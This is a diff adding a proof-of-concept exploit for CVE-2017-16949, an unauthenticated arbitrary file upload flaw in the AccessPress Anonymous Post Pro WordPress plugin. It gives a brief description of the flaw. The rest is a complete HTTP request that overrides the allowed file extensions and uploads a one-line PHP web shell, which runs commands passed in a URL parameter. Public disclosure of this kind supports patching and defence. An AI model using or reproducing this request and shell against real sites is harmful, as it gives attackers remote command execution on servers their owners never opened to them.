@@ -1,0 +1,38 @@
+# Exploit Title: Unauthenticated Arbitrary File Upload
+# Date: November 12, 2017
+# Exploit Author: Colette Chamberland 
+# Author contact: colette@defiant.com
+# Author homepage: https://defiant.com
+# Vendor Homepage: https://accesspressthemes.com/
+# Software Link: https://codecanyon.net/item/accesspress-anonymous-post-pro/9160446
+# Version:  < 3.2.0
+# Tested on: Wordpress 4.x
+# CVE : CVE-2017-16949
+
+
+Description:
+Improper sanitization allows the attacker to override the settings for allowed file extensions and upload file size. This allows
+the attacker to upload anything they want, bypassing the filters.
+ 
+PoC:
+
+POST /wp-admin/admin-ajax.php?action=ap_file_upload_action&file_uploader_nonce=[nonce]&allowedExtensions[]=php&sizeLimit=64000 HTTP/1.1
+Host:server
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------7230359611602921801124357792
+Content-Length: 264
+Referer: http://target.com/
+Cookie: PHPSESSID=22cj9s25f72jr376ln2a3oj6h6; 
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+-----------------------------7230359611602921801124357792
+Content-Disposition: form-data; name="qqfile"; filename="myshell.php"
+Content-Type: text/php
+
+<?php echo shell_exec($_GET['e'].' 2>&1'); ?>
+
+-----------------------------7230359611602921801124357792--
